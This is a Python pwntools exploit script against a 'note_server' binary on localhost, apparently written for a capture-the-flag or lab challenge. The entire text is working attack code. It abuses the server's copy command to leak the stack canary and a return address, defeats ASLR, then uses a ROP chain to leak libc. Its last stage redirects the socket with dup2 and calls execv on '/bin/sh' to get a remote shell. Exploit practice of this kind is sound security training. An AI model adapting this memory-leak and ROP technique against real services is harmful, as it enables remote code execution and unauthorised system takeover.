import struct
from pwn import *
context.binary = ELF('./note_server')
e = context.binary
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc')
p = remote("127.0.0.1", 5001)

def write(data):
	p.send("\x01")
	p.send(p8(len(data)))
	p.send(data)

def copy(offset,size):
	p.send("\x02")
	p.send(p16(offset))
	p.send(p8(size))

def read():
	p.send("\x03")

def exploit(canary,rop):
	payload = b"A" * 8
	payload += p64(canary)
	payload += p64(rbp)
	payload += bytes(rop)
	junk = b"A" * (200 - len(payload))
	write(payload + junk)
	write("A"* 200)
	write("A"* 200)
	write("A"* 200)
	write("A"* 224)
	copy(0,len(payload))
	read()
	p.recv(1024 + len(payload)) 	

log.info("Stage One - Defeat ASLR")
write("A"* 200)
write("A"* 200)
write("A"* 200)
write("A"* 200)
write("A"* 224)
copy(1024,255)
read()
p.recv(1024)
p.recv(8)
canary = u64(p.recv(8))
log.success(f"Canary: {hex(canary)}")

rbp = u64(p.recv(8))
ret = u64(p.recv(8))
base = u64(p.recv(8))
log.success(f"Return: {hex(ret)}")

e.address = ret - 0xf54

log.info("Stage two - Find libc")
p = remote("127.0.0.1", 5001)
rop = ROP(e)
rop.call(e.plt['write'], [4, e.got['read']])
exploit(canary,rop)

read_leak = u64(p.recv(8))
libc.address = read_leak - libc.sym['read']

log.info("Stage Three - pwn")
p = remote("127.0.0.1", 5001)
rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh\x00"))
rop.dup2(4,0)
rop.dup2(4,1)
rop.dup2(4,2)
rop.execv(binsh,0) 
exploit(canary,rop)

p.interactive()
